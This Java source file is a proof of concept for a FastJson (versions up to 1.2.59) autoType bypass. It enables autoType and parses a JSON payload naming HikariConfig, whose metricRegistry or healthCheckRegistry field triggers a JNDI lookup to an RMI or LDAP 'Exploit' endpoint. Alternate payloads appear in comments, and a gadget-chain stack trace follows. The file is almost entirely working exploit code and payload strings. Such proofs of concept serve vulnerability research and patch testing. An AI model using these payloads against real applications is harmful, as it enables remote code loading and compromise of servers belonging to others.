import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.zaxxer.hikari.HikariConfig;
public class Below_1_2_59_PoC {
    public static void main(String[] args) throws Exception {
        System.out.println("[+] ByPass FastJson <= 1.2.59 JNDI PoC");
        System.out.println("[!] Need setAutoTypeSupport");
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://localhost:1099/j1dse2\"}";
        //{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
        //{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}

        /*
getObjectOrPerformJndiLookup:1155, HikariConfig (com.zaxxer.hikari)
setMetricRegistry:663, HikariConfig (com.zaxxer.hikari)
deserialze:-1, FastjsonASMDeserializer_1_HikariConfig (com.alibaba.fastjson.parser.deserializer)
deserialze:284, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:400, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1394, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1360, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:165, JSON (com.alibaba.fastjson)
parse:175, JSON (com.alibaba.fastjson)
parse:144, JSON (com.alibaba.fastjson)
main:10, Below_1_2_59_PoC
         */
        JSON.parse(payload);
    }
}
